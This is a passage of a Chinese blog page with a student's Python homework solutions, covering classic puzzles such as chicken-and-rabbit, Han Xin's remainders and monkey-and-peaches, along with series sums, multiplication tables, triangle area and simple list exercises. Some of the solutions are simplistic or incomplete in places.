class="built_in">input</span>(<span class="string">&quot;请输入总脚数（必须是偶数）：&quot;</span>))</span><br><span class="line"></span><br><span class="line">r = f / <span class="number">2</span> - h</span><br><span class="line">c = h - r</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c &gt;= <span class="number">0</span> <span class="keyword">and</span> r &gt;= <span class="number">0</span> <span class="keyword">and</span> c == <span class="built_in">int</span>(c) <span class="keyword">and</span> r == <span class="built_in">int</span>(r):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;方法一：鸡：<span class="subst">&#123;<span class="built_in">int</span>(c)&#125;</span>只，兔：<span class="subst">&#123;<span class="built_in">int</span>(r)&#125;</span>只&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;方法一：无解，请重新运行测试！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h + <span class="number">1</span>):</span><br><span class="line">    r = h - c</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> * c + <span class="number">4</span> * r == f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;方法二：鸡：<span class="subst">&#123;<span class="built_in">int</span>(c)&#125;</span>只，兔：<span class="subst">&#123;<span class="built_in">int</span>(r)&#125;</span>只&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;方法二：无解，请重新运行测试！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="输入任意实数-x-计算-e-的近似值，直到最后一项的绝对值小于-10-6-为止"><a href="#输入任意实数-x-计算-e-的近似值，直到最后一项的绝对值小于-10-6-为止" class="headerlink" title="输入任意实数 x, 计算 e 的近似值，直到最后一项的绝对值小于 10  6  为止"></a>输入任意实数 x, 计算 e 的近似值，直到最后一项的绝对值小于 10 <sup> 6 </sup> 为止</h3><p>偷个懒，直接用 math 库嘿嘿</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入x：&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(math.e, x))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="输入任意实数-a-a≥0-，用迭代法求-x-√a-要求计算的相对偏差小于-10-6-。"><a href="#输入任意实数-a-a≥0-，用迭代法求-x-√a-要求计算的相对偏差小于-10-6-。" class="headerlink" title="输入任意实数 a(a≥0)，用迭代法求 x &#x3D; √a, 要求计算的相对偏差小于 10 -6 。"></a>输入任意实数 a(a≥0)，用迭代法求 x &#x3D; √a, 要求计算的相对偏差小于 10 <sup>-6 </sup>。</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sqrt_iterative</span>(<span class="params">a, tolerance=<span class="number">1e-6</span></span>):</span><br><span class="line">    x = a</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        next_x = <span class="number">0.5</span> * (x + a / x)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(next_x - x) &lt; tolerance:</span><br><span class="line">            <span class="keyword">return</span> next_x</span><br><span class="line">        x = next_x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入a：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> a &gt;= <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;a:<span class="number">.0</span>f&#125;</span>的算数平方根为=<span class="subst">&#123;sqrt_iterative(a)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入的数必须大于等于0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="我国汉代有位大将，名叫韩信。他每次集合部队，只要求部下先后按-13、15、17-报数，然后再报告一下各队每次报数的余数，他就知道到了多少人。他的这种巧妙算法被人们称为“鬼谷算”，也叫“隔墙算”，或称为“韩信点兵”，外国人还称它为“中国余数定理”。即有一个数，用-3-除余-2，用-5-除余-3，用-7-除余-2，请问-01000-中这样的数有哪些？"><a href="#我国汉代有位大将，名叫韩信。他每次集合部队，只要求部下先后按-13、15、17-报数，然后再报告一下各队每次报数的余数，他就知道到了多少人。他的这种巧妙算法被人们称为“鬼谷算”，也叫“隔墙算”，或称为“韩信点兵”，外国人还称它为“中国余数定理”。即有一个数，用-3-除余-2，用-5-除余-3，用-7-除余-2，请问-01000-中这样的数有哪些？" class="headerlink" title="我国汉代有位大将，名叫韩信。他每次集合部队，只要求部下先后按 13、15、17 报数，然后再报告一下各队每次报数的余数，他就知道到了多少人。他的这种巧妙算法被人们称为“鬼谷算”，也叫“隔墙算”，或称为“韩信点兵”，外国人还称它为“中国余数定理”。即有一个数，用 3 除余 2，用 5 除余 3，用 7 除余 2，请问 01000 中这样的数有哪些？"></a>我国汉代有位大将，名叫韩信。他每次集合部队，只要求部下先后按 1<del class="mask">3、1</del>5、1<del class="mask">7 报数，然后再报告一下各队每次报数的余数，他就知道到了多少人。他的这种巧妙算法被人们称为“鬼谷算”，也叫“隔墙算”，或称为“韩信点兵”，外国人还称它为“中国余数定理”。即有一个数，用 3 除余 2，用 5 除余 3，用 7 除余 2，请问 0</del>1000 中这样的数有哪些？</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0~1000中用3除余2，用5除余3，用7除余2的数有：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1001</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span> <span class="keyword">and</span> i % <span class="number">5</span> == <span class="number">3</span> <span class="keyword">and</span> i % <span class="number">7</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="一球从-100-米的高度自由落下，每次落地后反弹回原高度的一半，再落下。·求小球在第-10-次落地时共经过多少米？第-10-次反弹多高？"><a href="#一球从-100-米的高度自由落下，每次落地后反弹回原高度的一半，再落下。·求小球在第-10-次落地时共经过多少米？第-10-次反弹多高？" class="headerlink" title="一球从 100 米的高度自由落下，每次落地后反弹回原高度的一半，再落下。·求小球在第 10 次落地时共经过多少米？第 10 次反弹多高？"></a>一球从 100 米的高度自由落下，每次落地后反弹回原高度的一半，再落下。·求小球在第 10 次落地时共经过多少米？第 10 次反弹多高？</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始高度</span></span><br><span class="line">height = <span class="number">100</span></span><br><span class="line"><span class="comment"># 总距离</span></span><br><span class="line">total_distance = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算第10次落地时的总距离和反弹高度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    height /= <span class="number">2</span></span><br><span class="line">    total_distance += height * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;小球在第10次落地时，共经过<span class="subst">&#123;total_distance&#125;</span>米&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;第10次反弹<span class="subst">&#123;height&#125;</span>米&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="猴子吃桃问题。猴子第一天摘下若干个桃子，当天吃掉一半多一个；第二天接着吃了剩下的桃子的一半多一个；以后每天都吃了前一天剩下的桃子的一半多一个。到第-8-天发现只剩一个桃子了。请问猴子第一天共摘了多少个桃子？"><a href="#猴子吃桃问题。猴子第一天摘下若干个桃子，当天吃掉一半多一个；第二天接着吃了剩下的桃子的一半多一个；以后每天都吃了前一天剩下的桃子的一半多一个。到第-8-天发现只剩一个桃子了。请问猴子第一天共摘了多少个桃子？" class="headerlink" title="猴子吃桃问题。猴子第一天摘下若干个桃子，当天吃掉一半多一个；第二天接着吃了剩下的桃子的一半多一个；以后每天都吃了前一天剩下的桃子的一半多一个。到第 8 天发现只剩一个桃子了。请问猴子第一天共摘了多少个桃子？"></a>猴子吃桃问题。猴子第一天摘下若干个桃子，当天吃掉一半多一个；第二天接着吃了剩下的桃子的一半多一个；以后每天都吃了前一天剩下的桃子的一半多一个。到第 8 天发现只剩一个桃子了。请问猴子第一天共摘了多少个桃子？</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 猴子吃桃</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">monkey_eat_peach</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (monkey_eat_peach(n - <span class="number">1</span>) + <span class="number">1</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>天的桃子数为：<span class="subst">&#123;monkey_eat_peach(i+<span class="number">1</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="计算-S-n-1-11-111-1111-ldots-1111-（最后一项是-n-个-1-）。提示：第-1-项-T-1-1-；第-2-项-T-2-T-1-times-10-1-；…；第-n-项-T-n-T-n-1-times-10-1-。-n-是一个随机产生的-1-10-（包括-1-和-10-）中的正整数。"><a href="#计算-S-n-1-11-111-1111-ldots-1111-（最后一项是-n-个-1-）。提示：第-1-项-T-1-1-；第-2-项-T-2-T-1-times-10-1-；…；第-n-项-T-n-T-n-1-times-10-1-。-n-是一个随机产生的-1-10-（包括-1-和-10-）中的正整数。" class="headerlink" title="计算 $S_n &#x3D; 1+11+111+1111+\ldots+1111$（最后一项是 $n$ 个 $1$）。提示：第 $1$ 项 $T_1 &#x3D; 1$；第 $2$ 项 $T_2 &#x3D; T_1 \times 10 + 1$；…；第 $n$ 项 $T_n &#x3D; T_{n-1} \times 10 + 1$。$n$ 是一个随机产生的 $1$~$10$（包括 $1$ 和 $10$）中的正整数。"></a>计算 $S_n &#x3D; 1+11+111+1111+\ldots+1111$（最后一项是 $n$ 个 $1$）。提示：第 $1$ 项 $T_1 &#x3D; 1$；第 $2$ 项 $T_2 &#x3D; T_1 \times 10 + 1$；…；第 $n$ 项 $T_n &#x3D; T_{n-1} \times 10 + 1$。$n$ 是一个随机产生的 $1$~$10$（包括 $1$ 和 $10$）中的正整数。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">an</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> an(n - <span class="number">1</span>) * <span class="number">10</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sn = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">    sn += an(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当n=<span class="subst">&#123;n&#125;</span>时，sum_sn=<span class="subst">&#123;sn&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="作业-3-常用内置数据类型"><a href="#作业-3-常用内置数据类型" class="headerlink" title="作业 3 常用内置数据类型"></a>作业 3 常用内置数据类型</h2><h3 id="编写程序，计算-1-2-3-十十-100-之和。"><a href="#编写程序，计算-1-2-3-十十-100-之和。" class="headerlink" title="编写程序，计算 1+2+3 十十 100 之和。"></a>编写程序，计算 1+2+3 十十 100 之和。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，计算-10-十-9-十-8-十十-1-之和。"><a href="#编写程序，计算-10-十-9-十-8-十十-1-之和。" class="headerlink" title="编写程序，计算 10 十 9 十 8 十十 1 之和。"></a>编写程序，计算 10 十 9 十 8 十十 1 之和。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，计算-1-十-3-十-5-十-7-十-99-之和。"><a href="#编写程序，计算-1-十-3-十-5-十-7-十-99-之和。" class="headerlink" title="编写程序，计算 1 十 3 十 5 十 7 十 99 之和。"></a>编写程序，计算 1 十 3 十 5 十 7 十 99 之和。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，计算-2-十-4-十-6-十-8…十-100-之和。"><a href="#编写程序，计算-2-十-4-十-6-十-8…十-100-之和。" class="headerlink" title="编写程序，计算 2 十 4 十 6 十 8…十 100 之和。"></a>编写程序，计算 2 十 4 十 6 十 8…十 100 之和。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，使用不同的实现方法输出-2000-一-3000-的所有闰年"><a href="#编写程序，使用不同的实现方法输出-2000-一-3000-的所有闰年" class="headerlink" title="编写程序，使用不同的实现方法输出 2000 一 3000 的所有闰年"></a>编写程序，使用不同的实现方法输出 2000 一 3000 的所有闰年</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>, <span class="number">3001</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">100</span> != <span class="number">0</span> <span class="keyword">or</span> i % <span class="number">400</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，计算-S-13-十-5-一-7-十-9-一-11-十…"><a href="#编写程序，计算-S-13-十-5-一-7-十-9-一-11-十…" class="headerlink" title="编写程序，计算 S.&#x3D; 13+十 5 一 7 十 9 一 11 十…"></a>编写程序，计算 S.&#x3D; 13+十 5 一 7 十 9 一 11 十…</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入奇数&quot;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">Sn = <span class="number">0</span></span><br><span class="line">sign = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    Sn += sign * i</span><br><span class="line">    sign *= -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sn =&quot;</span>, Sn)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，计算-S-1-十-1-2-十-1-3-十…"><a href="#编写程序，计算-S-1-十-1-2-十-1-3-十…" class="headerlink" title="编写程序，计算 S.&#x3D; 1 十 1&#x2F;2 十 1&#x2F;3 十…"></a>编写程序，计算 S.&#x3D; 1 十 1&#x2F;2 十 1&#x2F;3 十…</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 求n分之一</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fraction_to_decimal</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入一个整数：&quot;</span>))</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">sum</span> += fraction_to_decimal(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，打印九九乘法表。要求输出九九乘法表的各种显示效果（上三角、下三角、矩形块等方式-。"><a href="#编写程序，打印九九乘法表。要求输出九九乘法表的各种显示效果（上三角、下三角、矩形块等方式-。" class="headerlink" title="编写程序，打印九九乘法表。要求输出九九乘法表的各种显示效果（上三角、下三角、矩形块等方式)。"></a>编写程序，打印九九乘法表。要求输出九九乘法表的各种显示效果（上三角、下三角、矩形块等方式)。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印九九乘法表的矩形块</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_multiplication_table</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印九九乘法表的上三角</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_upper_triangle</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="number">10</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印九九乘法表的下三角</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_lower_triangle</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>*<span class="subst">&#123;j&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>, end=<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;矩形块:&quot;</span>)</span><br><span class="line">print_multiplication_table()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n上三角:&quot;</span>)</span><br><span class="line">print_upper_triangle()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n下三角:&quot;</span>)</span><br><span class="line">print_lower_triangle()</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，输入三角形的-3-条边，先判断是否可以构成三角形，如果可以，则进一步求三角形的周长和面积，否则报错“无法构成三角形！”。其运行效果如图-3-11-所示（结果均保留一位小数-。"><a href="#编写程序，输入三角形的-3-条边，先判断是否可以构成三角形，如果可以，则进一步求三角形的周长和面积，否则报错“无法构成三角形！”。其运行效果如图-3-11-所示（结果均保留一位小数-。" class="headerlink" title="编写程序，输入三角形的 3 条边，先判断是否可以构成三角形，如果可以，则进一步求三角形的周长和面积，否则报错“无法构成三角形！”。其运行效果如图 3-11 所示（结果均保留一位小数)。"></a>编写程序，输入三角形的 3 条边，先判断是否可以构成三角形，如果可以，则进一步求三角形的周长和面积，否则报错“无法构成三角形！”。其运行效果如图 3-11 所示（结果均保留一位小数)。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">a, b, c = (</span><br><span class="line">    <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的三边长：&quot;</span>)),</span><br><span class="line">    <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的三边长：&quot;</span>)),</span><br><span class="line">    <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的三边长：&quot;</span>)),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> a + b &gt; c <span class="keyword">and</span> a + c &gt; b <span class="keyword">and</span> b + c &gt; a <span class="keyword">and</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span> <span class="keyword">and</span> c &gt; <span class="number">0</span>:</span><br><span class="line">    S = (a + b + c) / <span class="number">2</span></span><br><span class="line">    area = (S * (S - a) * (S - b) * (S - c)) ** <span class="number">0.5</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;三角形的面积为：<span class="subst">&#123;area&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入的三边长不能构成一个三角形&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="作业-4-序列数据类型"><a href="#作业-4-序列数据类型" class="headerlink" title="作业 4 序列数据类型"></a>作业 4 序列数据类型</h2><h3 id="统计单词个数"><a href="#统计单词个数" class="headerlink" title="统计单词个数"></a>统计单词个数</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串：&quot;</span>)</span><br><span class="line">space_count = <span class="number">0</span></span><br><span class="line">number_count = <span class="number">0</span></span><br><span class="line">other_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot; &quot;</span>:</span><br><span class="line">        space_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;其中单词数为：<span class="subst">&#123;space_count+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="删除-list-重复元素"><a href="#删除-list-重复元素" class="headerlink" title="删除 list 重复元素"></a>删除 list 重复元素</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> new_list:</span><br><span class="line">        new_list.append(i)</span><br><span class="line"><span class="built_in">print</span>(new_list)</span><br></pre></td></tr></table></figure></div>

<h3 id="求列表中元素个数，最大值，最小值，元素之和，平均值"><a href="#求列表中元素个数，最大值，最小值，元素之和，平均值" class="headerlink" title="求列表中元素个数，最大值，最小值，元素之和，平均值"></a>求列表中元素个数，最大值，最小值，元素之和，平均值</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">55</span>, <span class="number">6</span>]</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="built_in">max</span> = s[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">min</span> = s[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">avg = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="built_in">max</span>:</span><br><span class="line">        <span class="built_in">max</span> = i</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">min</span>:</span><br><span class="line">        <span class="built_in">min</span> = i</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">avg = <span class="built_in">sum</span> / <span class="built_in">len</span>(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最大值：<span class="subst">&#123;<span class="built_in">max</span>&#125;</span>，最小值：<span class="subst">&#123;<span class="built_in">min</span>&#125;</span>，和：<span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>，平均值：<span class="subst">&#123;avg&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="列表内偶数变次方，奇数不变"><a href="#列表内偶数变次方，奇数不变" class="headerlink" title="列表内偶数变次方，奇数不变"></a>列表内偶数变次方，奇数不变</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">new_s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        new_s.append(i**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_s.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;变换前：<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;变换后：<span class="subst">&#123;new_s&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

